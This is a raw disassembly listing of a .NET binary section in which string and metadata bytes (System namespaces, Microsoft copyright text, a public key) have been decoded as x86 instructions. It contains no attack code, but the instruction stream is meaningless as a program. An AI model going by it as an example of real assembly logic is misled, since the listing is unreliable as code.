  40354a:	je     0x4035ad
  40354c:	je     0x4035b3
  40354e:	add    BYTE PTR [ebx+0x79],dl
  403551:	jae    0x4035c7
  403553:	gs ins DWORD PTR es:[edi],dx
  403555:	cs push ebx
  403557:	arpl   WORD PTR gs:[ebp+0x72],si
  40355b:	imul   esi,DWORD PTR [ecx+edi*2+0x0],0x65766e55
  403563:	jb     0x4035ce
  403565:	imul   sp,WORD PTR [ecx+0x62],0x656c
  40356b:	inc    ebx
  40356c:	outs   dx,DWORD PTR ds:[esi]
  40356d:	fs gs inc ecx
  403570:	je     0x4035e6
  403572:	jb     0x4035dd
  403574:	bound  esi,QWORD PTR [ebp+0x74]
  403577:	add    BYTE PTR gs:[ebp+0x69],cl
  40357b:	arpl   WORD PTR [edx+0x6f],si
  40357e:	jae    0x4035ef
  403580:	data16 je 0x4035b1
  403583:	push   esi
  403584:	imul   esi,DWORD PTR [ebx+0x75],0x74536c61
  40358b:	jne    0x4035f1
  40358d:	imul   ebp,DWORD PTR [edi+0x2e],0x65746e49
  403594:	ins    BYTE PTR es:[edi],dx
  403595:	ins    BYTE PTR es:[edi],dx
  403596:	imul   edx,DWORD PTR [edx+esi*2+0x61],0x542e6563
  40359e:	outs   dx,DWORD PTR ds:[esi]
  40359f:	outs   dx,DWORD PTR ds:[esi]
  4035a0:	ins    BYTE PTR es:[edi],dx
  4035a1:	jae    0x4035d1
  4035a3:	dec    esp
  4035a4:	outs   dx,DWORD PTR ds:[esi]
  4035a5:	addr16 addr16 gs jb 0x4035fc
  4035aa:	gs jae 0x40361c
  4035ad:	jne    0x403621
  4035af:	arpl   WORD PTR [ebp+0x73],sp
  4035b2:	cs jb  0x40361a
  4035b5:	jae    0x403626
  4035b7:	jne    0x40362b
  4035b9:	arpl   WORD PTR [ebp+0x73],sp
  4035bc:	add    BYTE PTR [eax],al
  4035be:	add    BYTE PTR [eax],al
  4035c0:	add    BYTE PTR [ecx],ah
  4035c2:	push   esi
  4035c3:	add    BYTE PTR [ebx+0x0],dl
  4035c6:	dec    esp
  4035c7:	add    BYTE PTR [edi+0x0],cl
  4035ca:	inc    edi
  4035cb:	add    BYTE PTR [edi+0x0],bl
  4035ce:	push   edx
  4035cf:	add    BYTE PTR [ebp+0x0],al
  4035d2:	dec    ebp
  4035d3:	add    BYTE PTR [edi+0x0],cl
  4035d6:	push   esp
  4035d7:	add    BYTE PTR [ebp+0x0],al
  4035da:	pop    edi
  4035db:	add    BYTE PTR [eax+eax*1+0x4f],cl
  4035df:	add    BYTE PTR [edi+0x0],al
  4035e2:	add    BYTE PTR [ecx],ch
  4035e4:	push   esi
  4035e5:	add    BYTE PTR [ebx+0x0],dl
  4035e8:	push   esp
  4035e9:	add    BYTE PTR [eax+eax*1+0x5f],al
  4035ed:	add    BYTE PTR [ecx+0x0],al
  4035f0:	push   ebx
  4035f1:	add    BYTE PTR [ebx+0x0],dl
  4035f4:	inc    ebp
  4035f5:	add    BYTE PTR [edx+0x0],dl
  4035f8:	push   esp
  4035f9:	add    BYTE PTR [edi+0x0],bl
  4035fc:	dec    edi
  4035fd:	add    BYTE PTR [esi+0x0],cl
  403600:	pop    edi
  403601:	add    BYTE PTR [ebx+0x0],dl
  403604:	push   esp
  403605:	add    BYTE PTR [ecx+0x0],al
  403608:	push   edx
  403609:	add    BYTE PTR [eax+eax*1+0x0],dl
  40360d:	adc    edx,DWORD PTR [eax+eax*1+0x72]
  403611:	add    BYTE PTR [ecx+0x0],ah
  403614:	arpl   WORD PTR [eax],ax
  403616:	add    BYTE PTR gs:[eax+eax*1+0x6f],cl
  40361b:	add    BYTE PTR [edi+0x0],ah
  40361e:	xor    al,BYTE PTR [eax]
  403620:	add    BYTE PTR [ecx],dl
  403622:	push   esp
  403623:	add    BYTE PTR [edx+0x0],dh
  403626:	popa   
  403627:	add    BYTE PTR [ebx+0x0],ah
  40362a:	add    BYTE PTR gs:[eax+eax*1+0x6f],cl
  40362f:	add    BYTE PTR [edi+0x0],ah
  403632:	add    BYTE PTR [ebx+0x4d],dh
  403635:	add    BYTE PTR [ecx+0x0],ch
  403638:	arpl   WORD PTR [eax],ax
  40363a:	jb     0x40363c
  40363c:	outs   dx,DWORD PTR ds:[esi]
  40363d:	add    BYTE PTR [ebx+0x0],dh
  403640:	outs   dx,DWORD PTR ds:[esi]
  403641:	add    BYTE PTR [esi+0x0],ah
  403644:	je     0x403646
  403646:	add    BYTE PTR cs:[esi+0x0],dl
  40364a:	imul   eax,DWORD PTR [eax],0x750073
  403650:	popa   
  403651:	add    BYTE PTR [eax+eax*1+0x53],ch
  403655:	add    BYTE PTR [eax+eax*1+0x75],dh
  403659:	add    BYTE PTR [eax+eax*1+0x69],ah
  40365d:	add    BYTE PTR [edi+0x0],ch
  403660:	add    BYTE PTR cs:[ecx+0x0],cl
  403664:	outs   dx,BYTE PTR ds:[esi]
  403665:	add    BYTE PTR [eax+eax*1+0x65],dh
  403669:	add    BYTE PTR [eax+eax*1+0x6c],ch
  40366d:	add    BYTE PTR [ecx+0x0],ch
  403670:	push   esp
  403671:	add    BYTE PTR [edx+0x0],dh
  403674:	popa   
  403675:	add    BYTE PTR [ebx+0x0],ah
  403678:	add    BYTE PTR gs:[esi],ch
  40367b:	add    BYTE PTR [eax+eax*1+0x6f],dl
  40367f:	add    BYTE PTR [edi+0x0],ch
  403682:	ins    BYTE PTR es:[edi],dx
  403683:	add    BYTE PTR [ebx+0x0],dh
  403686:	add    BYTE PTR cs:[eax+eax*1+0x6f],cl
  40368b:	add    BYTE PTR [edi+0x0],ah
  40368e:	add    BYTE PTR [di+0x0],ah
  403692:	jb     0x403694
  403694:	push   edx
  403695:	add    BYTE PTR [ebp+0x0],ah
  403698:	jae    0x40369a
  40369a:	outs   dx,DWORD PTR ds:[esi]
  40369b:	add    BYTE PTR [ebp+0x0],dh
  40369e:	jb     0x4036a0
  4036a0:	arpl   WORD PTR [eax],ax
  4036a2:	add    BYTE PTR gs:[ebx+0x0],dh
  4036a6:	add    BYTE PTR [ecx],ah
  4036a8:	inc    ebx
  4036a9:	add    BYTE PTR [eax+eax*1+0x72],dh
  4036ad:	add    BYTE PTR [eax+eax*1+0x42],ch
  4036b1:	add    BYTE PTR [edx+0x0],dh
  4036b4:	add    BYTE PTR gs:[ecx+0x0],ah
  4036b8:	imul   eax,DWORD PTR [eax],0x50
  4036bb:	add    BYTE PTR [edx+0x0],dh
  4036be:	add    BYTE PTR gs:[ebx+0x0],dh
  4036c2:	jae    0x4036c4
  4036c4:	add    BYTE PTR gs:[eax+eax*1+0x0],ah
  4036c9:	sbb    DWORD PTR [ebx+0x0],eax
  4036cc:	je     0x4036ce
  4036ce:	jb     0x4036d0
  4036d0:	ins    BYTE PTR es:[edi],dx
  4036d1:	add    BYTE PTR [ebx+0x0],al
  4036d4:	push   eax
  4036d5:	add    BYTE PTR [edx+0x0],dh
  4036d8:	add    BYTE PTR gs:[ebx+0x0],dh
  4036dc:	jae    0x4036de
  4036de:	add    BYTE PTR gs:[eax+eax*1+0x0],ah
  4036e3:	add    al,al
  4036e5:	inc    eax
  4036e6:	add    al,0x1f
  4036e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4036e9:	imul   esp,DWORD PTR [edi],0xfbad8442
  4036ef:	ss ss pop ebp
  4036f2:	sbb    BYTE PTR [edi+0x7ab70800],0x5c
  4036f9:	push   esi
  4036fa:	sbb    DWORD PTR [eax+eiz*8],esi
  4036fd:	mov    DWORD PTR ds:0x1d080100,eax
  403703:	push   cs
  403704:	add    al,0x0
  403706:	add    DWORD PTR [ecx],eax
  403708:	add    al,BYTE PTR [ebx]
  40370a:	push   es
  40370b:	adc    cl,BYTE PTR [ecx]
  40370d:	add    eax,DWORD PTR [esi]
  40370f:	adc    cl,BYTE PTR ds:0x1002003
  403715:	add    al,0x0
  403717:	add    BYTE PTR [edx],dl
  403719:	or     DWORD PTR [eax+eax*1],eax
  40371c:	add    BYTE PTR [edx],dl
  40371e:	or     eax,0x1010005
  403723:	adc    cl,BYTE PTR ds:0xe000003
  403729:	add    al,0x8
  40372b:	add    BYTE PTR [edx],dl
  40372d:	or     DWORD PTR [eax+ecx*1],eax
  403730:	add    BYTE PTR [edx],dl
  403732:	or     eax,0xe000803
  403737:	add    al,0x20
  403739:	add    DWORD PTR [ecx],eax
  40373b:	add    al,BYTE PTR [eax+eiz*1]
  40373e:	add    DWORD PTR [ecx],eax
  403740:	push   cs
  403741:	add    eax,0x11010120
  403746:	pop    ecx
  403747:	add    eax,0x11010120
  40374c:	popa   
  40374d:	add    al,0x20
  40374f:	add    DWORD PTR [ecx],eax
  403751:	or     BYTE PTR [eax+0x2400a0],al
  403757:	add    BYTE PTR [eax+eax*4],al
  40375a:	add    BYTE PTR [eax],al
  40375c:	xchg   esp,eax
  40375d:	add    BYTE PTR [eax],al
  40375f:	add    BYTE PTR [esi],al
  403761:	add    al,BYTE PTR [eax]
  403763:	add    BYTE PTR [eax],al
  403765:	and    al,0x0
  403767:	add    BYTE PTR [edx+0x53],dl
  40376a:	inc    ecx
  40376b:	xor    DWORD PTR [eax],eax
  40376d:	add    al,0x0
  40376f:	add    BYTE PTR [ecx],al
  403771:	add    BYTE PTR [ecx],al
  403773:	add    BYTE PTR [edi],al
  403775:	sar    edx,1
  403777:	push   edi
  403778:	les    ebp,FWORD PTR [esi+0x2ea3f0d9]
  40377e:	test   BYTE PTR [edx+0xdfdae0f],ch
  403784:	jmp    0xecab3571
  403789:	pop    DWORD PTR [edi+0x6c7603fb]
  40378f:	or     DWORD PTR [ecx+ebx*4-0x6e],0x1e
  403794:	mov    dl,0x3b
  403796:	out    0x9a,eax
  403798:	(bad)  
  40379a:	fadd   st(1),st
  40379c:	fstp   QWORD PTR [edx+0x211336d2]
  4037a2:	add    dl,BYTE PTR [eax-0x6c38df5]
  4037a8:	adc    BYTE PTR [ebp+0x77e1c47f],0x10
  4037af:	pop    esi
  4037b1:	pop    es
  4037b2:	ja     0x403803
  4037b4:	sub    eax,ebp
  4037b6:	xor    cl,BYTE PTR [esi]
  4037b8:	xchg   edx,eax
  4037b9:	jmp    0xc021:0xe8e4ec05
  4037c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4037c1:	out    dx,eax
  4037c2:	call   0x4c9c9cb8
  4037c7:	or     al,0x93
  4037c9:	shr    DWORD PTR [ebx+0x625d2899],0x2c
  4037d0:	stos   BYTE PTR es:[edi],al
  4037d1:	gs sub al,0x1d
  4037d4:	cli    
  4037d5:	(bad)  
  4037d6:	cmp    eax,0x2d6f5d74
  4037db:	in     eax,0xf1
  4037dd:	jle    0x40383d
  4037df:	scas   eax,DWORD PTR es:[edi]
  4037e0:	pinsrw mm2,WORD PTR [esi-0x75e3d9c3],0x12
  4037e8:	inc    ebx
  4037e9:	sbb    BYTE PTR gs:[eax],ah
  4037ec:	ins    DWORD PTR es:[edi],dx
  4037ed:	rcl    BYTE PTR [ebx-0x2da5b2cc],0x93
  4037f4:	add    eax,0x11010120
  4037f9:	ins    DWORD PTR es:[edi],dx
  4037fa:	or     BYTE PTR [ecx],al
  4037fc:	add    BYTE PTR [ecx],al
  4037fe:	add    BYTE PTR [eax],al
  403800:	add    BYTE PTR [eax],al
  403802:	add    BYTE PTR [eax],cl
  403804:	mov    al,0x3f
  403806:	pop    edi
  403807:	jg     0x40381a
  403809:	aad    0xa
  40380b:	cmp    al,BYTE PTR [ebx]
  40380d:	push   es
  40380e:	adc    dh,BYTE PTR [ecx+0x2]
  403811:	push   es
  403812:	or     BYTE PTR [ebx],al
  403814:	push   es
  403815:	sbb    eax,0x20030e
  40381a:	or     BYTE PTR [ebx],al
  40381c:	push   es
  40381d:	adc    dl,BYTE PTR [eax]
  40381f:	add    eax,DWORD PTR [esi]
  403821:	adc    dh,BYTE PTR [ebp+0x6]
  403824:	and    BYTE PTR [edx],al
  403826:	add    DWORD PTR [edx+edx*1],ebx
  403829:	jns    0x403830
  40382b:	and    BYTE PTR [ecx],al
  40382d:	add    DWORD PTR [edx],edx
  40382f:	jno    0x403836
  403831:	and    BYTE PTR [eax],al
  403833:	adc    DWORD PTR [eax+0x200581],eax
  403839:	adc    al,BYTE PTR [eax+0x1200485]
  40383f:	add    al,BYTE PTR [edx]
  403841:	add    esp,DWORD PTR [eax]
  403843:	add    BYTE PTR [edx],al
  403845:	add    al,0x7
  403847:	add    DWORD PTR [edx],edx
  403849:	jge    0x40384d
  40384b:	push   es
  40384c:	push   cs
  40384d:	add    eax,0xe0e0200
  403852:	push   cs
  403853:	pop    es
  403854:	and    BYTE PTR [edx],al
  403856:	add    DWORD PTR [edx],edx
  403858:	add    BYTE PTR [ebp+0x220050e],0x1
  40385f:	sbb    al,0x18
  403861:	push   es
  403862:	add    BYTE PTR [ecx],al
  403864:	add    DWORD PTR [edx],edx
  403866:	adc    BYTE PTR [ebp+0x2012005],0x1d
  40386d:	push   cs
  40386e:	add    al,0x7
  403870:	add    DWORD PTR [edx],edx
  403872:	adc    al,0x4
  403874:	add    BYTE PTR [ecx],al
  403876:	push   cs
  403877:	push   cs
  403878:	add    al,0x0
  40387a:	add    DWORD PTR [edx],eax
  40387c:	push   cs
  40387d:	or     ah,BYTE PTR [eax]
  40387f:	add    DWORD PTR [ecx],eax
  403881:	adc    eax,0x1b58012
  403886:	adc    dh,BYTE PTR [ecx+0x7]
  403889:	add    BYTE PTR [edx],al
  40388b:	or     BYTE PTR [edx],dl
  40388d:	cmp    BYTE PTR [ebp+0x6070e02],0xe
  403894:	adc    bh,BYTE PTR [ebp+0x12]
  403897:	cmp    BYTE PTR [ebp+0x1d081012],0x12
  40389e:	jno    0x4038aa
  4038a0:	add    DWORD PTR [eax],eax
  4038a2:	add    eax,0x55424544
  4038a7:	inc    edi
  4038a8:	add    BYTE PTR [eax],al
  4038aa:	push   es
  4038ab:	and    BYTE PTR [ecx],al
  4038ad:	sbb    eax,0x8031d0e
  4038b2:	add    BYTE PTR [ebx],al
  4038b4:	or     BYTE PTR [esi],cl
  4038b6:	push   cs
  4038b7:	adc    DWORD PTR [eax+0x6070ad5],eax
  4038bd:	push   cs
  4038be:	push   cs
  4038bf:	push   cs
  4038c0:	sbb    eax,0x80e1d03
  4038c5:	add    al,0x1
  4038c7:	add    BYTE PTR [eax],al
  4038c9:	add    BYTE PTR ds:0xe010220,al
  4038cf:	push   cs
  4038d0:	inc    eax
  4038d1:	add    DWORD PTR [eax],eax
  4038d3:	xor    edx,DWORD PTR [ebx+0x79]
  4038d6:	jae    0x40394c
  4038d8:	gs ins DWORD PTR es:[edi],dx
  4038da:	cs push edx
  4038dc:	gs jae 0x40394e
  4038df:	jne    0x403953
  4038e1:	arpl   WORD PTR [ebp+0x73],sp
  4038e4:	cs push esp
  4038e6:	outs   dx,DWORD PTR ds:[esi]
  4038e7:	outs   dx,DWORD PTR ds:[esi]
  4038e8:	ins    BYTE PTR es:[edi],dx
  4038e9:	jae    0x403919
  4038eb:	push   ebx
  4038ec:	je     0x403960
  4038ee:	outs   dx,DWORD PTR ds:[esi]
  4038ef:	outs   dx,BYTE PTR ds:[esi]
  4038f0:	ins    BYTE PTR es:[di],dx
  4038f2:	jns    0x403948
  4038f4:	jns    0x403966
  4038f6:	gs fs push edx
  4038f9:	gs jae 0x40396b
  4038fc:	jne    0x403970
  4038fe:	arpl   WORD PTR [ebp+0x42],sp
  403901:	jne    0x40396c
  403903:	ins    BYTE PTR es:[edi],dx
  403904:	fs gs jb 0x40390f
  403908:	xor    ch,BYTE PTR [esi]
  40390a:	xor    BYTE PTR [esi],ch
  40390c:	xor    BYTE PTR [esi],ch
  40390e:	xor    BYTE PTR [eax],al
  403910:	add    BYTE PTR ds:0x1c020200,al
  403916:	sbb    al,0x8
  403918:	add    BYTE PTR [ecx],al
  40391a:	adc    al,BYTE PTR [eax-0x167fee1b]
  403920:	add    eax,0x80120020
  403925:	in     eax,dx
  403926:	pop    es
  403927:	and    BYTE PTR [edx],al
  403929:	add    DWORD PTR [esi],ecx
  40392b:	adc    al,BYTE PTR [eax+0x10704ed]
  403931:	adc    cl,BYTE PTR [ecx]
  403933:	push   es
  403934:	and    BYTE PTR [edx],al
  403936:	push   cs
  403937:	push   cs
  403938:	adc    cl,BYTE PTR ds:0x1012006
  40393e:	adc    DWORD PTR [eax+0x108f5],eax
  403944:	add    al,BYTE PTR [eax]
  403946:	add    BYTE PTR [eax],al
  403948:	add    BYTE PTR [eax],al
  40394a:	add    eax,0x1
  40394f:	add    BYTE PTR ds:0x49100001,dl
  403955:	outs   dx,BYTE PTR ds:[esi]
  403956:	je     0x4039bd
  403958:	ins    BYTE PTR es:[edi],dx
  403959:	ins    BYTE PTR es:[edi],dx
  40395a:	imul   edx,DWORD PTR [edx+esi*2+0x61],0x652e6563
  403962:	js     0x4039c9
  403964:	add    BYTE PTR [eax],al
  403966:	sbb    al,BYTE PTR [ecx]
  403968:	add    BYTE PTR ds:0x7263694d,dl
  40396e:	outs   dx,DWORD PTR ds:[esi]
  40396f:	jae    0x4039e0
  403971:	data16 je 0x403994
  403974:	inc    ebx
  403975:	outs   dx,DWORD PTR ds:[esi]
  403976:	jb     0x4039e8
  403978:	outs   dx,DWORD PTR ds:[esi]
  403979:	jb     0x4039dc
  40397b:	je     0x4039e6
  40397d:	outs   dx,DWORD PTR ds:[esi]
  40397e:	outs   dx,BYTE PTR ds:[esi]
  40397f:	add    BYTE PTR [eax],al
  403981:	and    eax,0x4d200001
  403986:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  40398d:	je     0x403951
  40398f:	scas   al,BYTE PTR es:[edi]
  403990:	and    BYTE PTR [esi+0x69],dl
  403993:	jae    0x403a0a
  403995:	popa   
  403996:	ins    BYTE PTR es:[edi],dx
  403997:	and    BYTE PTR [ebx+0x74],dl
  40399a:	jne    0x403a00
  40399c:	imul   ebp,DWORD PTR [edi-0x3e],0x303220ae
  4039a3:	xor    DWORD PTR [edx],esi
  4039a5:	add    BYTE PTR [eax],al
  4039a7:	xor    eax,DWORD PTR [ecx]
  4039a9:	add    BYTE PTR [esi],ch
  4039ab:	ret    0x20a9
  4039ae:	dec    ebp
  4039af:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  4039b6:	je     0x4039d8
  4039b8:	inc    ebx
  4039b9:	outs   dx,DWORD PTR ds:[esi]
  4039ba:	jb     0x403a2c
  4039bc:	outs   dx,DWORD PTR ds:[esi]
  4039bd:	jb     0x403a20
  4039bf:	je     0x403a2a
  4039c1:	outs   dx,DWORD PTR ds:[esi]
  4039c2:	outs   dx,BYTE PTR ds:[esi]
  4039c3:	and    BYTE PTR cs:[ecx+0x6c],al
  4039c7:	ins    BYTE PTR es:[edi],dx
  4039c8:	and    BYTE PTR [edx+0x69],dh
  4039cb:	addr16 push 0x72207374
  4039d1:	gs jae 0x403a39
  4039d4:	jb     0x403a4c
  4039d6:	gs fs add BYTE PTR cs:[eax],al
  4039db:	or     al,BYTE PTR [ecx]
  4039dd:	add    BYTE PTR ds:0x552d6e65,al
  4039e3:	push   ebx
  4039e4:	add    BYTE PTR [eax],al
  4039e6:	add    eax,0x10001
  4039eb:	add    BYTE PTR [edx],ch
  4039ed:	add    DWORD PTR [eax],eax
  4039ef:	and    eax,0x645c3a46
  4039f4:	fs pop esp
  4039f6:	je     0x403a67
  4039f8:	outs   dx,DWORD PTR ds:[esi]
  4039f9:	ins    BYTE PTR es:[edi],dx
  4039fa:	jae    0x403a58
  4039fc:	fs gs jbe 0x403a64
  403a00:	imul   esi,DWORD PTR [esi+0x5c],0x616e6946
  403a07:	ins    BYTE PTR es:[edi],dx
  403a08:	push   eax
  403a09:	jne    0x403a6d
  403a0b:	ins    BYTE PTR es:[edi],dx
  403a0c:	imul   esp,DWORD PTR [ebx+0x4b],0x732e7965
  403a13:	outs   dx,BYTE PTR ds:[esi]
  403a14:	imul   eax,DWORD PTR [eax],0x0
  403a17:	push   ds
  403a18:	add    DWORD PTR [eax],eax
  403a1a:	add    DWORD PTR [eax],eax
  403a1c:	push   esp
  403a1d:	add    dl,BYTE PTR [esi]
  403a1f:	push   edi
  403a20:	jb     0x403a83
  403a22:	jo     0x403a72
  403a24:	outs   dx,DWORD PTR ds:[esi]
  403a25:	outs   dx,BYTE PTR ds:[esi]
  403a26:	inc    ebp
  403a27:	js     0x403a8c
  403a29:	gs jo  0x403aa0
  403a2c:	imul   ebp,DWORD PTR [edi+0x6e],0x6f726854
  403a33:	ja     0x403aa8
  403a35:	add    DWORD PTR [edx],edx
  403a37:	add    DWORD PTR [eax],eax
  403a39:	or     eax,0x302e3131
  403a3e:	cs xor eax,0x37323730
  403a44:	xor    BYTE PTR cs:[ecx],dh
  403a47:	add    BYTE PTR [eax],al
  403a49:	or     eax,0x31080001
  403a4e:	xor    DWORD PTR [esi],ebp
  403a50:	xor    BYTE PTR [esi],ch
  403a52:	xor    BYTE PTR [esi],ch
  403a54:	xor    BYTE PTR [eax],al
  403a56:	add    BYTE PTR [ecx-0x7efffe91],al
  403a5c:	imul   ecx,DWORD PTR [ebp+0x69],0x736f7263
  403a63:	outs   dx,DWORD PTR ds:[esi]
  403a64:	data16 je 0x403a95
  403a67:	dec    ecx
  403a68:	outs   dx,BYTE PTR ds:[esi]
  403a69:	je     0x403ad0
  403a6b:	ins    BYTE PTR es:[edi],dx
  403a6c:	ins    BYTE PTR es:[edi],dx
  403a6d:	imul   edx,DWORD PTR [edx+esi*2+0x61],0x312e6563
  403a75:	xor    DWORD PTR [esi],ebp
  403a77:	xor    BYTE PTR [esi],ch
  403a79:	xor    BYTE PTR [eax+eiz*1],ch
  403a7c:	push   eax
  403a7d:	jne    0x403ae1
  403a7f:	ins    BYTE PTR es:[edi],dx
  403a80:	imul   esp,DWORD PTR [ebx+0x4b],0x303d7965
  403a87:	xor    BYTE PTR [edx],dh
  403a89:	xor    al,0x30
  403a8b:	xor    BYTE PTR [eax],dh
  403a8d:	xor    BYTE PTR [eax],dh
  403a8f:	xor    al,0x38
  403a91:	xor    BYTE PTR [eax],dh
  403a93:	xor    BYTE PTR [eax],dh
  403a95:	xor    BYTE PTR [ecx],bh
  403a97:	xor    al,0x30
  403a99:	xor    BYTE PTR [eax],dh
  403a9b:	xor    BYTE PTR [eax],dh
  403a9d:	xor    BYTE PTR [eax],dh
  403a9f:	xor    BYTE PTR ss:[edx],dh
  403aa2:	xor    BYTE PTR [eax],dh
  403aa4:	xor    BYTE PTR [eax],dh
  403aa6:	xor    BYTE PTR [eax],dh
  403aa8:	xor    dh,BYTE PTR [eax+esi*1]
  403aab:	xor    BYTE PTR [eax],dh
  403aad:	xor    BYTE PTR ds:0x34333532,dh
  403ab3:	xor    DWORD PTR [ebx],esi
  403ab5:	xor    DWORD PTR [eax],esi
  403ab7:	xor    BYTE PTR [eax],dh
  403ab9:	xor    al,0x30
  403abb:	xor    BYTE PTR [eax],dh
  403abd:	xor    BYTE PTR [eax],dh
  403abf:	xor    DWORD PTR [eax],esi
  403ac1:	xor    BYTE PTR [eax],dh
  403ac3:	xor    DWORD PTR [eax],esi
  403ac5:	xor    BYTE PTR [eax],dh
  403ac7:	aaa    
  403ac8:	xor    DWORD PTR fs:[esi+0x61],esp
  403acc:	xor    eax,0x61346337
  403ad1:	gs cmp DWORD PTR fs:[esi+0x30],esp
  403ad6:	popa   
  403ad7:	xor    esi,DWORD PTR [edx]
  403ad9:	cmp    BYTE PTR gs:[ecx+eiz*2],dh
  403add:	popa   
  403ade:	xor    BYTE PTR [esi+0x61],ah
  403ae1:	gs data16 xor BYTE PTR fs:[ebp+eiz*2+0x39],ah
  403ae8:	cmp    BYTE PTR gs:[esi+0x64],ah
  403aec:	ss popa 
  403aee:	arpl   WORD PTR gs:[eax],di
  403af1:	data16 cmp BYTE PTR [edi],dh
  403af4:	bound  si,DWORD PTR [eax]
  403af7:	xor    esi,DWORD PTR [edi]
  403af9:	ss arpl WORD PTR ss:[eax],di
  403afd:	xor    esi,DWORD PTR [ebx+eiz*2]
  403b00:	cmp    DWORD PTR [ecx],edi
  403b02:	cmp    DWORD PTR [edx],esi
  403b04:	xor    DWORD PTR [ebp+0x62],esp
  403b07:	xor    dh,BYTE PTR [ebx]
  403b09:	bound  esp,QWORD PTR [ebp+0x37]
  403b0c:	cmp    DWORD PTR [ecx+0x64],esp
  403b0f:	cmp    DWORD PTR [ebp+esi*1+0x64],esp
  403b13:	arpl   WORD PTR [ebx+0x31],sp
  403b16:	fs cmp DWORD PTR fs:[ecx+0x64],esp
  403b1b:	xor    dh,BYTE PTR [ebx]
  403b1d:	xor    DWORD PTR ss:[ebx],esi
  403b20:	xor    dh,BYTE PTR [ecx]
  403b22:	xor    BYTE PTR [edx],dh
  403b24:	cmp    DWORD PTR [eax],esi
  403b26:	xor    BYTE PTR [edx+0x37],ah
  403b29:	xor    dh,BYTE PTR [ebx]
  403b2b:	arpl   WORD PTR [esi+0x39],sp
  403b2e:	cmp    BYTE PTR [eax],dh
  403b30:	cmp    DWORD PTR ds:0x34636637,esi
  403b36:	xor    DWORD PTR gs:[edi],esi
  403b39:	aaa    
  403b3a:	xor    DWORD PTR [eax],esi
  403b3c:	cmp    BYTE PTR [esi+0x63],ah
  403b3f:	xor    BYTE PTR ss:[edi],dh
  403b42:	aaa    
  403b43:	aaa    
  403b44:	xor    al,0x66
  403b46:	xor    bh,BYTE PTR [ecx]
  403b48:	cmp    BYTE PTR gs:[ebx],dh
  403b4b:	xor    dh,BYTE PTR [eax]
  403b4d:	cmp    DWORD PTR gs:[edx],esi
  403b50:	gs popa 
  403b52:	xor    BYTE PTR ds:0x34656365,dh
  403b58:	cmp    BYTE PTR gs:[edx],dh
  403b5b:	xor    DWORD PTR [ebx+0x30],esp
  403b5e:	popa   
  403b5f:	xor    eax,0x38656665
  403b64:	xor    WORD PTR [esi],si
  403b67:	xor    al,0x35
  403b69:	arpl   WORD PTR [ebx+eiz*2],si
  403b6c:	xor    BYTE PTR [ebx+0x39],ah
  403b6f:	xor    esp,DWORD PTR [ebx+0x31]
  403b72:	popa   
  403b73:	bound  edi,QWORD PTR [ecx]
  403b75:	cmp    DWORD PTR [edx],esi
  403b77:	cmp    BYTE PTR ds:0x32323664,dh
  403b7d:	arpl   WORD PTR [ecx+0x61],sp
  403b80:	ss xor eax,0x64316332
  403b86:	popaw  
  403b88:	fs xor esp,DWORD PTR ss:[edi+esi*1+0x34]
  403b8e:	xor    eax,0x32663664
  403b93:	fs gs xor eax,0x65373166
  403b9a:	xor    eax,0x30666165
  403b9f:	data16 arpl WORD PTR [ecx+edi*1],si
  403ba3:	xor    esp,DWORD PTR ss:[edx+esi*1+0x36]
  403ba8:	xor    DWORD PTR [ebx+0x38],esp
  403bab:	popa   
  403bac:	xor    DWORD PTR [edx],esi
  403bae:	xor    al,0x33
  403bb0:	ss xor eax,0x30323831
  403bb6:	ss arpl WORD PTR fs:[eax],si
  403bba:	cmp    DWORD PTR [ebx],esi
  403bbc:	xor    esi,DWORD PTR [esp+esi*1]
  403bbf:	fs xor eax,0x39326461
  403bc5:	xor    eax,DWORD PTR [eax]
  403bc7:	add    BYTE PTR [ecx-0x7efffe8e],al
  403bcd:	ins    BYTE PTR es:[edi],dx
  403bce:	dec    ebp
  403bcf:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  403bd6:	je     0x403c06
  403bd8:	dec    ecx
  403bd9:	outs   dx,BYTE PTR ds:[esi]
  403bda:	je     0x403c41
  403bdc:	ins    BYTE PTR es:[edi],dx
  403bdd:	ins    BYTE PTR es:[edi],dx
  403bde:	imul   edx,DWORD PTR [edx+esi*2+0x61],0x532e6563
  403be6:	inc    ebx
  403be7:	xor    DWORD PTR cs:[ecx],esi
  403bea:	xor    BYTE PTR cs:[esi],ch
  403bed:	xor    BYTE PTR [eax+eiz*1],ch
  403bf0:	push   eax
  403bf1:	jne    0x403c55
  403bf3:	ins    BYTE PTR es:[edi],dx
  403bf4:	imul   esp,DWORD PTR [ebx+0x4b],0x303d7965
  403bfb:	xor    BYTE PTR [edx],dh
  403bfd:	xor    al,0x30
  403bff:	xor    BYTE PTR [eax],dh
  403c01:	xor    BYTE PTR [eax],dh
  403c03:	xor    al,0x38
  403c05:	xor    BYTE PTR [eax],dh
  403c07:	xor    BYTE PTR [eax],dh
  403c09:	xor    BYTE PTR [ecx],bh
  403c0b:	xor    al,0x30
  403c0d:	xor    BYTE PTR [eax],dh
  403c0f:	xor    BYTE PTR [eax],dh
  403c11:	xor    BYTE PTR [eax],dh
  403c13:	xor    BYTE PTR ss:[edx],dh
  403c16:	xor    BYTE PTR [eax],dh
  403c18:	xor    BYTE PTR [eax],dh
  403c1a:	xor    BYTE PTR [eax],dh
  403c1c:	xor    dh,BYTE PTR [eax+esi*1]
  403c1f:	xor    BYTE PTR [eax],dh
  403c21:	xor    BYTE PTR ds:0x34333532,dh
  403c27:	xor    DWORD PTR [ebx],esi
  403c29:	xor    DWORD PTR [eax],esi
  403c2b:	xor    BYTE PTR [eax],dh
  403c2d:	xor    al,0x30
  403c2f:	xor    BYTE PTR [eax],dh
  403c31:	xor    BYTE PTR [eax],dh
  403c33:	xor    DWORD PTR [eax],esi
  403c35:	xor    BYTE PTR [eax],dh
  403c37:	xor    DWORD PTR [eax],esi
  403c39:	xor    BYTE PTR [eax],dh
  403c3b:	aaa    
  403c3c:	xor    DWORD PTR fs:[esi+0x61],esp
  403c40:	xor    eax,0x61346337
  403c45:	gs cmp DWORD PTR fs:[esi+0x30],esp
  403c4a:	popa   
  403c4b:	xor    esi,DWORD PTR [edx]
  403c4d:	cmp    BYTE PTR gs:[ecx+eiz*2],dh
  403c51:	popa   
  403c52:	xor    BYTE PTR [esi+0x61],ah
